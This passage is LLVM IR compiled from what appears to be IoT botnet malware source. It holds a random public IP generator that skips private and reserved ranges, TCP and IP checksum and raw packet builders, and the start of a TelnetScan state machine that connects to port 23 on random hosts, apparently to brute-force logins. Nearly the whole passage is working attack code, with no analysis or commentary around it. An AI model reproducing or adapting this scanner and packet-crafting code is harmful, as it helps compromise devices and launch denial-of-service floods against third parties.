  %62 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 100
  br i1 %64, label %65, label %73

65:                                               ; preds = %61
  %66 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sge i32 %67, 64
  br i1 %68, label %69, label %73

69:                                               ; preds = %65
  %70 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 127
  br i1 %72, label %169, label %73

73:                                               ; preds = %69, %65, %61
  %74 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %75 = zext i8 %74 to i32
  %76 = icmp eq i32 %75, 127
  br i1 %76, label %169, label %77

77:                                               ; preds = %73
  %78 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 169
  br i1 %80, label %81, label %85

81:                                               ; preds = %77
  %82 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 254
  br i1 %84, label %169, label %85

85:                                               ; preds = %81, %77
  %86 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %87 = zext i8 %86 to i32
  %88 = icmp eq i32 %87, 172
  br i1 %88, label %89, label %97

89:                                               ; preds = %85
  %90 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sle i32 %91, 16
  br i1 %92, label %93, label %97

93:                                               ; preds = %89
  %94 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %95 = zext i8 %94 to i32
  %96 = icmp sle i32 %95, 31
  br i1 %96, label %169, label %97

97:                                               ; preds = %93, %89, %85
  %98 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %99 = zext i8 %98 to i32
  %100 = icmp eq i32 %99, 192
  br i1 %100, label %101, label %109

101:                                              ; preds = %97
  %102 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %109

105:                                              ; preds = %101
  %106 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %107 = zext i8 %106 to i32
  %108 = icmp eq i32 %107, 2
  br i1 %108, label %169, label %109

109:                                              ; preds = %105, %101, %97
  %110 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp eq i32 %111, 192
  br i1 %112, label %113, label %121

113:                                              ; preds = %109
  %114 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 88
  br i1 %116, label %117, label %121

117:                                              ; preds = %113
  %118 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %119 = zext i8 %118 to i32
  %120 = icmp eq i32 %119, 99
  br i1 %120, label %169, label %121

121:                                              ; preds = %117, %113, %109
  %122 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 192
  br i1 %124, label %125, label %129

125:                                              ; preds = %121
  %126 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %127 = zext i8 %126 to i32
  %128 = icmp eq i32 %127, 168
  br i1 %128, label %169, label %129

129:                                              ; preds = %125, %121
  %130 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 198
  br i1 %132, label %133, label %141

133:                                              ; preds = %129
  %134 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %135 = zext i8 %134 to i32
  %136 = icmp eq i32 %135, 18
  br i1 %136, label %169, label %137

137:                                              ; preds = %133
  %138 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 19
  br i1 %140, label %169, label %141

141:                                              ; preds = %137, %129
  %142 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 198
  br i1 %144, label %145, label %153

145:                                              ; preds = %141
  %146 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %147 = zext i8 %146 to i32
  %148 = icmp eq i32 %147, 51
  br i1 %148, label %149, label %153

149:                                              ; preds = %145
  %150 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 100
  br i1 %152, label %169, label %153

153:                                              ; preds = %149, %145, %141
  %154 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %155 = zext i8 %154 to i32
  %156 = icmp eq i32 %155, 203
  br i1 %156, label %157, label %165

157:                                              ; preds = %153
  %158 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 0
  br i1 %160, label %161, label %165

161:                                              ; preds = %157
  %162 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 113
  br i1 %164, label %169, label %165

165:                                              ; preds = %161, %157, %153
  %166 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %167 = zext i8 %166 to i32
  %168 = icmp sge i32 %167, 224
  br label %169

169:                                              ; preds = %165, %161, %149, %137, %133, %125, %117, %105, %93, %81, %73, %69, %57, %53
  %170 = phi i1 [ true, %161 ], [ true, %149 ], [ true, %137 ], [ true, %133 ], [ true, %125 ], [ true, %117 ], [ true, %105 ], [ true, %93 ], [ true, %81 ], [ true, %73 ], [ true, %69 ], [ true, %57 ], [ true, %53 ], [ %168, %165 ]
  br i1 %170, label %171, label %184

171:                                              ; preds = %169
  %172 = call i32 @rand() #12
  %173 = srem i32 %172, 255
  %174 = trunc i32 %173 to i8
  store i8 %174, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %175 = call i32 @rand() #12
  %176 = srem i32 %175, 255
  %177 = trunc i32 %176 to i8
  store i8 %177, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %178 = call i32 @rand() #12
  %179 = srem i32 %178, 255
  %180 = trunc i32 %179 to i8
  store i8 %180, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %181 = call i32 @rand() #12
  %182 = srem i32 %181, 255
  %183 = trunc i32 %182 to i8
  store i8 %183, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %53, !llvm.loop !38

184:                                              ; preds = %169
  %185 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i64 0, i64 0
  %186 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %187 = zext i8 %186 to i32
  %188 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %189 = zext i8 %188 to i32
  %190 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %191 = zext i8 %190 to i32
  %192 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %193 = zext i8 %192 to i32
  %194 = call i32 (i8*, i8*, ...) @szprintf(i8* noundef %185, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.24, i64 0, i64 0), i32 noundef %187, i32 noundef %189, i32 noundef %191, i32 noundef %193)
  %195 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i64 0, i64 0
  %196 = call i32 @inet_addr(i8* noundef %195) #12
  store i32 %196, i32* %1, align 4
  br label %197

197:                                              ; preds = %184, %19
  %198 = load i32, i32* %1, align 4
  ret i32 %198
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getRandomIP(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 noundef %4) #15
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #8

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @csum(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !39

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !40

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* noundef %0, %struct.tcphdr* noundef %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 noundef zeroext 20) #15
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 noundef %28) #12
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* noundef %39, i32 noundef %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* noundef %43) #12
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #9

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* noundef %0, i32 noundef %1, i32 noundef %2, i8 noundef zeroext %3, i32 noundef %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @sclose(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

6:                                                ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

7:                                                ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 noundef %8)
  store i32 0, i32* %2, align 4
  br label %10

10:                                               ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @TelnetScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.__sigset_t*, align 8
  %15 = call i32 @getdtablesize() #12
  %16 = sdiv i32 %15, 4
  %17 = mul nsw i32 %16, 3
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* %1, align 4
  %19 = icmp sgt i32 %18, 512
  br i1 %19, label %20, label %21

20:                                               ; preds = %0
  br label %23

21:                                               ; preds = %0
  %22 = load i32, i32* %1, align 4
  br label %23

23:                                               ; preds = %21, %20
  %24 = phi i32 [ 512, %20 ], [ %22, %21 ]
  store i32 %24, i32* %1, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = call zeroext i16 @htons(i16 noundef zeroext 23) #15
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %29 = getelementptr inbounds [8 x i8], [8 x i8]* %28, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %29, i8 0, i64 8, i1 false)
  %30 = load i32, i32* %1, align 4
  %31 = zext i32 %30 to i64
  %32 = call i8* @llvm.stacksave()
  store i8* %32, i8** %9, align 8
  %33 = alloca %struct.telstate_t, i64 %31, align 16
  store i64 %31, i64* %10, align 8
  %34 = bitcast %struct.telstate_t* %33 to i8*
  %35 = load i32, i32* %1, align 4
  %36 = sext i32 %35 to i64
  %37 = mul i64 %36, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %34, i8 0, i64 %37, i1 false)
  store i32 0, i32* %2, align 4
  br label %38

38:                                               ; preds = %57, %23
  %39 = load i32, i32* %2, align 4
  %40 = load i32, i32* %1, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %60

42:                                               ; preds = %38
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 noundef 1024) #12
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %56, i8 0, i64 1024, i1 false)
  br label %57

57:                                               ; preds = %42
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  br label %38, !llvm.loop !41

60:                                               ; preds = %38
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 8, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 0, i64* %62, align 8
  br label %63

63:                                               ; preds = %2057, %60
  br label %64

64:                                               ; preds = %63
  store i32 0, i32* %2, align 4
  br label %65

65:                                               ; preds = %2054, %64
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  br i1 %68, label %69, label %2057

69:                                               ; preds = %65
  %70 = load i32, i32* %2, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %72, i32 0, i32 2
  %74 = load i8, i8* %73, align 8
  %75 = zext i8 %74 to i32
  switch i32 %75, label %2053 [
    i32 0, label %76
    i32 1, label %219
    i32 2, label %381
    i32 3, label %670
    i32 4, label %738
    i32 5, label %1082
    i32 6, label %1150
    i32 7, label %1959
    i32 8, label %1987
  ]

76:                                               ; preds = %69
  %77 = load i32, i32* %2, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 8
  %81 = load i8*, i8** %80, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %81, i8 0, i64 1024, i1 false)
  %82 = load i32, i32* %2, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %83
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 3
  %86 = load i8, i8* %85, align 1
  %87 = icmp ne i8 %86, 0
  br i1 %87, label %88, label %108

88:                                               ; preds = %76
  %89 = load i32, i32* %2, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %90
  %92 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %91, i32 0, i32 8
  %93 = load i8*, i8** %92, align 8
  store i8* %93, i8** %12, align 8
  %94 = load i32, i32* %2, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %95
  %97 = bitcast %struct.telstate_t* %96 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %97, i8 0, i64 32, i1 false)
  %98 = load i8*, i8** %12, align 8
  %99 = load i32, i32* %2, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %100
  %102 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %101, i32 0, i32 8
  store i8* %98, i8** %102, align 8
  %103 = call i32 @getRandomPublicIP()
  %104 = load i32, i32* %2, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %105
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %106, i32 0, i32 1
  store i32 %103, i32* %107, align 4
  br label %147

108:                                              ; preds = %76
  %109 = load i32, i32* %2, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 5
  %113 = load i8, i8* %112, align 1
  %114 = add i8 %113, 1
  store i8 %114, i8* %112, align 1
  %115 = load i32, i32* %2, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 5
  %119 = load i8, i8* %118, align 1
  %120 = zext i8 %119 to i64
  %121 = icmp eq i64 %120, 18
  br i1 %121, label %122, label %133

122:                                              ; preds = %108
  %123 = load i32, i32* %2, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 5
  store i8 0, i8* %126, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 4
  %131 = load i8, i8* %130, align 2
  %132 = add i8 %131, 1
  store i8 %132, i8* %130, align 2
  br label %133

133:                                              ; preds = %122, %108
  %134 = load i32, i32* %2, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 4
  %138 = load i8, i8* %137, align 2
  %139 = zext i8 %138 to i64
  %140 = icmp eq i64 %139, 10
  br i1 %140, label %141, label %146

141:                                              ; preds = %133
  %142 = load i32, i32* %2, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 3
  store i8 1, i8* %145, align 1
  br label %2054

146:                                              ; preds = %133
  br label %147

147:                                              ; preds = %146, %88
  %148 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %148, align 4
  %149 = call zeroext i16 @htons(i16 noundef zeroext 23) #15
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %149, i16* %150, align 2
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %152 = getelementptr inbounds [8 x i8], [8 x i8]* %151, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %152, i8 0, i64 8, i1 false)
  %153 = load i32, i32* %2, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %154
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 %157, i32* %159, align 4
  %160 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  %161 = load i32, i32* %2, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %162
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %163, i32 0, i32 0
  store i32 %160, i32* %164, align 16
  %165 = load i32, i32* %2, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %166
